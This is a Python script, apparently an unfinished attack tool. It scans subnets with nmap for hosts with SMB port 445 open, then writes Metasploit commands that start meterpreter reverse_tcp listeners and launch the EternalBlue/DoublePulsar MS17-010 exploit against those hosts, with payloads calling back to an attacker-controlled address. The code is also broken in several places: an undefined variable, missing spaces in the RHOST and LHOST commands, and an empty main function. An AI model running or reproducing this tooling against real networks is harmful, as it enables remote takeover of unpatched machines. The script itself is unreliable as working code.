import nmap
import netaddr
import sys
import os
import optparse

def findTgts(subnets,target_port):
    target_host_list=[]
    nmScan=nmap.PortScanner()
    nmScan.scan(hosts=subnet, ports=(str(target_port)),arguments=('--open'))
    for subnet in nmScan.all_hosts():
        try:
            state=nmScan[subnet]['tcp'][445]['state']
            if state == 'open':
                target_host_list.append(subnet)
        except:
            continue
    return target_host_list

def steup_win_Handler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('set LPORT '+lport+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def setup_linux_Handler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD linux/x86/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def ms17_010(configFile,rhost,lhost):
    configFile.write('use exploit/windows/smb/eternalblue_doublepulsar\n')
    configFile.write('set TARGETARCHITECTURE x64\n')
    configFile.write('set RHOST'+str(rhost)+'\n')
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST'+str(lhost)+'\n')


def attack_module_2():
    pass


def main():


if __name__ == '__main__':
    main()